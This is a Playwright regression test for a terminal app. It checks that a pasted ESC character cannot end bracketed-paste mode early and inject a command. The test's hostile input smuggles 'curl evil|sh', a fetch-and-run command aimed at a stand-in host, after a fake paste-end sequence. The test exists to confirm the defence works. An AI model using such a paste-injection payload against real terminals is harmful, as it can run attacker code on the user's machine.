import { expect, test } from "@playwright/test";

test("a pasted ESC cannot end bracketed paste early", async ({ page }) => {
  await page.goto("/");
  const observed = await page.evaluate(async () => {
    const ipcPath = "/src/platform/ipc.ts";
    const sessionPath = "/src/features/terminal/session.ts";
    const { commands } = await import(ipcPath);
    const { TerminalSession } = await import(sessionPath);
    Object.defineProperty(window, "__TAURI_INTERNALS__", {
      configurable: true,
      value: { transformCallback: () => 1 },
    });
    const writes: string[] = [];
    commands.termSpawn = async () => ({ status: "ok", data: { id: 839, title: "bash", pid: 1 } });
    commands.clipboardFileList = async () => ({ status: "ok", data: [] });
    commands.termWrite = async (_id: number, data: string) => writes.push(data);
    commands.termResize = async () => undefined;
    commands.termKill = async () => undefined;
    const container = document.createElement("div");
    container.style.cssText = "position:fixed;inset:0;z-index:99999";
    document.body.append(container);
    const session = new TerminalSession({ key: "paste-escape", cwd: "/tmp", onChange() {}, onFocus() {} });
    const paste = async (text: string) => {
      const before = writes.length;
      const transfer = new DataTransfer();
      transfer.setData("text/plain", text);
      const event = new ClipboardEvent("paste", { bubbles: true, cancelable: true, clipboardData: transfer });
      container.querySelector("textarea")!.dispatchEvent(event);
      const deadline = Date.now() + 5000;
      while (writes.length === before && Date.now() < deadline) {
        await new Promise((resolve) => requestAnimationFrame(resolve));
      }
      return { claimed: event.defaultPrevented, written: writes.slice(before) };
    };
    try {
      session.attach(container);
      await session.start();
      // xterm opens on a later frame, once the pane has a size.
      const openDeadline = Date.now() + 5000;
      while (!container.querySelector("textarea") && Date.now() < openDeadline) {
        await new Promise((resolve) => requestAnimationFrame(resolve));
      }
      // The shell asks for bracketed paste, as bash and zsh do at the prompt.
      await new Promise<void>((resolve) => session.term.write("\x1b[?2004h", resolve));
      return {
        hostile: await paste("README\x1b[201~;curl evil|sh;#\r"),
        plain: await paste("ls -la"),
      };
    } finally {
      session.dispose();
      container.remove();
    }
  });
  expect(observed.hostile).toEqual({
    claimed: true,
    written: ["\x1b[200~README\u241b[201~;curl evil|sh;#\r\x1b[201~"],
  });
  expect(observed.plain).toEqual({ claimed: false, written: ["\x1b[200~ls -la\x1b[201~"] });
});
